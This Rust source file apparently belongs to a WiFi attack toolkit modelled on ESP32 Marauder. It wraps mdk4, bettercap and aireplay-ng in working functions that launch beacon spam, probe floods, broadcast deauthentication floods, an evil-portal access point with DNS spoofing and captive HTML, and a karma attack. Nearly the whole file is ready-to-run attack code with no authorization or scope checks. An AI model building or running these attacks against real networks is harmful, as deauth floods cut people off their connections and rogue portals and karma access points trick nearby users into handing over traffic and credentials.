//! Attack engine — wraps external tools (mdk4, bettercap, aireplay-ng)
//! to provide WiFi attack capabilities matching ESP32 Marauder features.
//!
//! Design philosophy: leverage proven tools instead of reimplementing
//! 802.11 frame injection from scratch.
//!
//! # Tool Mapping
//! | Attack               | Tool          | mdk4 mode |
//! |----------------------|---------------|-----------|
//! | Beacon Spam (list)   | mdk4          | b -f      |
//! | Beacon Spam (random) | mdk4          | b         |
//! | Beacon Spam (clone)  | mdk4          | b -v      |
//! | Rick Roll Beacon     | mdk4          | b -f      |
//! | Probe Flood          | mdk4          | p         |
//! | Deauth (targeted)    | aireplay-ng   | --deauth  |
//! | Deauth (broadcast)   | mdk4          | d         |
//! | Evil Portal          | bettercap     | wifi.ap   |
//! | Karma Attack         | bettercap     | wifi.ap   |

use log::{error, info, warn};
use std::fs;
use std::io::{BufRead, BufReader};
use std::process::{Child, Command, Stdio};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;

// ─────────────────────────────────────────────────
// Attack Handle
// ─────────────────────────────────────────────────

/// Handle for a running attack process.
pub struct AttackHandle {
    stop_flag: Arc<AtomicBool>,
    child: Option<Child>,
    thread: Option<std::thread::JoinHandle<()>>,
    /// Temp files to clean up when stopped.
    temp_files: Vec<String>,
}

impl AttackHandle {
    pub fn stop(&mut self) {
        info!("Stopping attack...");
        self.stop_flag.store(true, Ordering::SeqCst);

        if let Some(ref mut child) = self.child {
            let _ = child.kill();
            let _ = child.wait();
        }
        self.child = None;

        if let Some(handle) = self.thread.take() {
            let _ = handle.join();
        }

        for f in &self.temp_files {
            let _ = fs::remove_file(f);
        }

        info!("Attack stopped.");
    }

    pub fn is_active(&self) -> bool {
        !self.stop_flag.load(Ordering::SeqCst)
    }
}

impl Drop for AttackHandle {
    fn drop(&mut self) {
        if self.is_active() {
            self.stop();
        }
    }
}

// ─────────────────────────────────────────────────
// Beacon Spam
// ─────────────────────────────────────────────────

/// Beacon spam mode variants (matching Marauder).
#[derive(Debug, Clone)]
pub enum BeaconSpamMode {
    /// Flood with a list of specific SSIDs.
    List(Vec<String>),
    /// Flood with randomly generated SSIDs.
    Random,
    /// Clone an existing AP's SSID (broadcast fake copies).
    Clone {
        ssid: String,
        bssid: Option<String>,
    },
    /// Rick Roll — flood with lyrics as SSIDs.
    RickRoll,
}

const RICKROLL_SSIDS: &[&str] = &[
    "01 Never gonna give you up",
    "02 Never gonna let you down",
    "03 Never gonna run around",
    "04 and desert you",
    "05 Never gonna make you cry",
    "06 Never gonna say goodbye",
    "07 Never gonna tell a lie",
    "08 and hurt you",
    "09 We've known each other",
    "10 for so long",
    "11 Your heart's been aching but",
    "12 you're too shy to say it",
];

/// Start a beacon spam attack using mdk4.
pub fn start_beacon_spam(
    interface_name: &str,
    mode: BeaconSpamMode,
    channel: Option<u8>,
    encryption: Option<&str>,
) -> Result<AttackHandle, crate::error::AetherError> {
    let mut temp_files = Vec::new();

    let mut args: Vec<String> = vec![
        interface_name.to_string(),
        "b".to_string(),
    ];

    match &mode {
        BeaconSpamMode::List(ssids) => {
            let path = write_ssid_file(ssids)?;
            args.push("-f".to_string());
            args.push(path.clone());
            temp_files.push(path);
        }
        BeaconSpamMode::Random => {
            // No extra args — mdk4 generates random SSIDs by default
        }
        BeaconSpamMode::Clone { ssid, bssid } => {
            if let Some(mac) = bssid {
                // Use -v file format: MAC SSID
                let content = format!("{} {}\n", mac, ssid);
                let path = write_temp_file("aether-clone", &content)?;
                args.push("-v".to_string());
                args.push(path.clone());
                temp_files.push(path);
            } else {
                args.push("-n".to_string());
                args.push(ssid.clone());
            }
        }
        BeaconSpamMode::RickRoll => {
            let ssids: Vec<String> = RICKROLL_SSIDS.iter().map(|s| s.to_string()).collect();
            let path = write_ssid_file(&ssids)?;
            args.push("-f".to_string());
            args.push(path.clone());
            temp_files.push(path);
        }
    }

    if let Some(ch) = channel {
        args.push("-c".to_string());
        args.push(ch.to_string());
    }

    if let Some(enc) = encryption {
        args.push("-w".to_string());
        args.push(enc.to_string());
    }

    // Use valid OUI MACs for realism
    args.push("-m".to_string());

    spawn_mdk4_attack(args, temp_files, &format!("beacon-spam-{:?}", mode))
}

// ─────────────────────────────────────────────────
// Probe Flood
// ─────────────────────────────────────────────────

/// Start a probe request flood using mdk4.
///
/// If `ssid` is provided, probes for that specific SSID.
/// If `bssid` is provided, targets that specific AP.
pub fn start_probe_flood(
    interface_name: &str,
    ssid: Option<&str>,
    bssid: Option<&str>,
) -> Result<AttackHandle, crate::error::AetherError> {
    let mut args = vec![
        interface_name.to_string(),
        "p".to_string(),
    ];

    if let Some(s) = ssid {
        args.push("-s".to_string());
        args.push(s.to_string());
    }

    if let Some(b) = bssid {
        args.push("-t".to_string());
        args.push(b.to_string());
    }

    spawn_mdk4_attack(args, Vec::new(), "probe-flood")
}

// ─────────────────────────────────────────────────
// MDK4 Deauth (broadcast)
// ─────────────────────────────────────────────────

/// Start a broadcast deauth attack using mdk4 mode d.
/// More aggressive than aireplay-ng's targeted approach.
pub fn start_mdk4_deauth(
    interface_name: &str,
    whitelist: Option<&[String]>,
    blacklist: Option<&[String]>,
) -> Result<AttackHandle, crate::error::AetherError> {
    let mut args = vec![
        interface_name.to_string(),
        "d".to_string(),
    ];
    let mut temp_files = Vec::new();

    if let Some(wl) = whitelist {
        let content = wl.join("\n") + "\n";
        let path = write_temp_file("aether-deauth-wl", &content)?;
        args.push("-w".to_string());
        args.push(path.clone());
        temp_files.push(path);
    }

    if let Some(bl) = blacklist {
        let content = bl.join("\n") + "\n";
        let path = write_temp_file("aether-deauth-bl", &content)?;
        args.push("-b".to_string());
        args.push(path.clone());
        temp_files.push(path);
    }

    spawn_mdk4_attack(args, temp_files, "mdk4-deauth")
}

// ─────────────────────────────────────────────────
// Bettercap API Client
// ─────────────────────────────────────────────────

/// Bettercap REST API connection settings.
#[derive(Debug, Clone)]
pub struct BettercapConfig {
    pub address: String,
    pub port: u16,
    pub username: String,
    pub password: String,
}

impl Default for BettercapConfig {
    fn default() -> Self {
        Self {
            address: "127.0.0.1".to_string(),
            port: 8083,
            username: "aether".to_string(),
            password: "aether".to_string(),
        }
    }
}

/// Handle for a running bettercap instance.
pub struct BettercapHandle {
    child: Option<Child>,
    config: BettercapConfig,
}

impl BettercapHandle {
    /// Send a command to bettercap's REST API.
    pub fn run_command(&self, cmd: &str) -> Result<String, crate::error::AetherError> {
        let url = format!(
            "http://{}:{}/api/session",
            self.config.address, self.config.port
        );

        let output = Command::new("curl")
            .arg("-s")
            .arg("-X").arg("POST")
            .arg("-u").arg(format!("{}:{}", self.config.username, self.config.password))
            .arg("-H").arg("Content-Type: application/json")
            .arg("-d").arg(format!(r#"{{"cmd":"{}"}}"#, cmd.replace('"', r#"\""#)))
            .arg(&url)
            .output()
            .map_err(|e| crate::error::AetherError::CaptureError(format!(
                "Failed to call bettercap API: {}", e
            )))?;

        let body = String::from_utf8_lossy(&output.stdout).to_string();
        if !output.status.success() {
            return Err(crate::error::AetherError::CaptureError(format!(
                "Bettercap API error: {}",
                String::from_utf8_lossy(&output.stderr)
            )));
        }

        Ok(body)
    }

    pub fn stop(&mut self) {
        info!("Stopping bettercap...");
        // Try graceful shutdown via API first
        let _ = self.run_command("quit");
        std::thread::sleep(std::time::Duration::from_millis(500));

        if let Some(ref mut child) = self.child {
            let _ = child.kill();
            let _ = child.wait();
        }
        self.child = None;
        info!("Bettercap stopped.");
    }
}

impl Drop for BettercapHandle {
    fn drop(&mut self) {
        self.stop();
    }
}

/// Start bettercap as a daemon with REST API enabled.
pub fn start_bettercap(
    interface_name: &str,
    config: BettercapConfig,
) -> Result<BettercapHandle, crate::error::AetherError> {
    info!(
        "Starting bettercap on '{}' with API on {}:{}",
        interface_name, config.address, config.port
    );

    let child = Command::new("bettercap")
        .arg("-iface").arg(interface_name)
        .arg("-api-rest-address").arg(&config.address)
        .arg("-api-rest-port").arg(config.port.to_string())
        .arg("-api-rest-username").arg(&config.username)
        .arg("-api-rest-password").arg(&config.password)
        .arg("-silent")
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .spawn()
        .map_err(|e| crate::error::AetherError::CaptureError(format!(
            "Failed to start bettercap: {}", e
        )))?;

    // Wait for API to become ready
    std::thread::sleep(std::time::Duration::from_secs(2));

    Ok(BettercapHandle {
        child: Some(child),
        config,
    })
}

// ─────────────────────────────────────────────────
// Evil Portal (via bettercap)
// ─────────────────────────────────────────────────

/// Start an evil portal attack using bettercap's wifi.ap module.
pub fn start_evil_portal(
    handle: &BettercapHandle,
    ssid: &str,
    channel: u8,
    portal_html: Option<&str>,
) -> Result<(), crate::error::AetherError> {
    // Write custom portal HTML if provided
    if let Some(html) = portal_html {
        let portal_path = "/tmp/aether-evil-portal.html";
        fs::write(portal_path, html).map_err(|e| {
            crate::error::AetherError::CaptureError(format!(
                "Failed to write portal HTML: {}", e
            ))
        })?;
        handle.run_command(&format!("set http.server.path {}", portal_path))?;
    }

    handle.run_command(&format!("set wifi.ap.ssid {}", ssid))?;
    handle.run_command(&format!("set wifi.ap.channel {}", channel))?;
    handle.run_command("set wifi.ap.encryption false")?;
    handle.run_command("wifi.ap on")?;
    handle.run_command("http.server on")?;
    handle.run_command("dns.spoof on")?;

    info!("Evil portal started: SSID='{}' CH={}", ssid, channel);
    Ok(())
}

/// Start a karma attack — responds to all probe requests.
pub fn start_karma(
    handle: &BettercapHandle,
    channel: u8,
) -> Result<(), crate::error::AetherError> {
    handle.run_command(&format!("set wifi.ap.channel {}", channel))?;
    handle.run_command("set wifi.ap.ssid AetherKarma")?;
    handle.run_command("set wifi.ap.encryption false")?;
    // Enable responding to all probe requests
    handle.run_command("set wifi.ap.karma true")?;
    handle.run_command("wifi.ap on")?;

    info!("Karma attack started on CH={}", channel);
    Ok(())
}

// ─────────────────────────────────────────────────
// Helpers
// ─────────────────────────────────────────────────

fn write_ssid_file(ssids: &[String]) -> Result<String, crate::error::AetherError> {
    let content = ssids.join("\n") + "\n";
    write_temp_file("aether-ssids", &content)
}

fn write_temp_file(prefix: &str, content: &str) -> Result<String, crate::error::AetherError> {
    let path = format!(
        "/tmp/{}-{}.txt",
        prefix,
        std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap_or_default()
            .as_millis()
    );
    fs::write(&path, content).map_err(|e| {
        crate::error::AetherError::CaptureError(format!("Failed to write temp file: {}", e))
    })?;
    Ok(path)
}

fn spawn_mdk4_attack(
    args: Vec<String>,
    temp_files: Vec<String>,
    label: &str,
) -> Result<AttackHandle, crate::error::AetherError> {
    info!("Starting mdk4 attack [{}]: mdk4 {}", label, args.join(" "));

    let stop_flag = Arc::new(AtomicBool::new(false));
    let stop_clone = stop_flag.clone();
    let label = label.to_string();

    let mut child = Command::new("mdk4")
        .args(&args)
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .map_err(|e| crate::error::AetherError::CaptureError(format!(
            "Failed to start mdk4: {}. Is mdk4 installed?", e
        )))?;

    // Spawn a monitoring thread to log mdk4 output
    let stderr = child.stderr.take();
    let thread = std::thread::Builder::new()
        .name(format!("aether-mdk4-{}", label))
        .spawn(move || {
            if let Some(stderr) = stderr {
                let reader = BufReader::new(stderr);
                for line in reader.lines() {
                    if stop_clone.load(Ordering::Relaxed) {
                        break;
                    }
                    match line {
                        Ok(l) => info!("[mdk4/{}] {}", label, l),
                        Err(_) => break,
                    }
                }
            }
        })
        .ok();

    Ok(AttackHandle {
        stop_flag,
        child: Some(child),
        thread,
        temp_files,
    })
}

// ─────────────────────────────────────────────────
// Tests
// ─────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn rickroll_ssids_not_empty() {
        assert!(RICKROLL_SSIDS.len() >= 8);
        for ssid in RICKROLL_SSIDS {
            assert!(!ssid.is_empty());
            assert!(ssid.len() <= 32);
        }
    }

    #[test]
    fn bettercap_config_defaults() {
        let config = BettercapConfig::default();
        assert_eq!(config.address, "127.0.0.1");
        assert_eq!(config.port, 8083);
    }

    #[test]
    fn write_ssid_file_creates_file() {
        let ssids = vec!["Test1".to_string(), "Test2".to_string()];
        let path = write_ssid_file(&ssids).unwrap();
        let content = fs::read_to_string(&path).unwrap();
        assert!(content.contains("Test1"));
        assert!(content.contains("Test2"));
        fs::remove_file(&path).unwrap();
    }

    #[test]
    fn attack_handle_temp_cleanup() {
        let path = write_temp_file("test-cleanup", "data").unwrap();
        assert!(std::path::Path::new(&path).exists());

        let mut handle = AttackHandle {
            stop_flag: Arc::new(AtomicBool::new(false)),
            child: None,
            thread: None,
            temp_files: vec![path.clone()],
        };
        handle.stop();
        assert!(!std::path::Path::new(&path).exists());
    }
}
